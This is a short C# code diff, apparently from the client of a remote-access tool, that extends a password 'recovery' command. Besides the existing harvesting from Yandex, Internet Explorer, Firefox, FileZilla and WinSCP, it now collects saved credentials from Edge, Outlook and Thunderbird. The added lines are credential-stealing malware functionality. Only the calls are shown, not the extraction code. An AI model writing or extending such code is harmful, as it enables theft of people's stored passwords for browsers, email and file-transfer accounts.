@@ -12,6 +12,7 @@ using System.Collections.Generic;
 using xClient.Core.Data;
 using xClient.Core.Recovery.Browsers;
 using xClient.Core.Recovery.FtpClients;
+using xClient.Core.Recovery.Other;
 
 namespace xClient.Core.Commands
 {
@@ -27,6 +28,9 @@ namespace xClient.Core.Commands
             recovered.AddRange(Yandex.GetSavedPasswords());
             recovered.AddRange(InternetExplorer.GetSavedPasswords());
             recovered.AddRange(Firefox.GetSavedPasswords());
+            recovered.AddRange(Edge.GetPasswords());
+            recovered.AddRange(Outlook.GetSavedPasswords());
+            recovered.AddRange(Thunderbird.GetSavedPasswords());
             recovered.AddRange(FileZilla.GetSavedPasswords());
             recovered.AddRange(WinSCP.GetSavedPasswords());
 
